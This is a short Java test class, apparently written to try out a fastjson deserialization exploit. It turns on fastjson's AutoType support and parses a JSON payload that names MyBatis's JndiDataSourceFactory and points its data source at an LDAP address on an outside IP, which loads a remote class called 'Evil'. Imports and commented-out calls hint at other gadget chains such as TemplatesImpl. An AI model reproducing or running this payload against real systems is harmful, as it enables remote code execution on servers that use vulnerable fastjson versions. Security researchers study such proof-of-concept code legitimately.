package fastjsonexp;


import com.alibaba.fastjson.*;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.rowset.JdbcRowSetImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;
import com.alibaba.fastjson.parser.ParserConfig;
import java.io.IOException;

public class test45 {

    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException {

        JdbcRowSetImpl();
//        TemplatesImpl();
//        getByteCodes();
    }


    public static void JdbcRowSetImpl(){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String s1 = "{\n" +
                "    \"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\n" +
                "    \"properties\":{\n" +
                "        \"data_source\":\"ldap://139.9.134.169:1100/Evil\"\n" +
                "    }\n" +
                "}";
        JSON.parseObject(s1);
    }


}
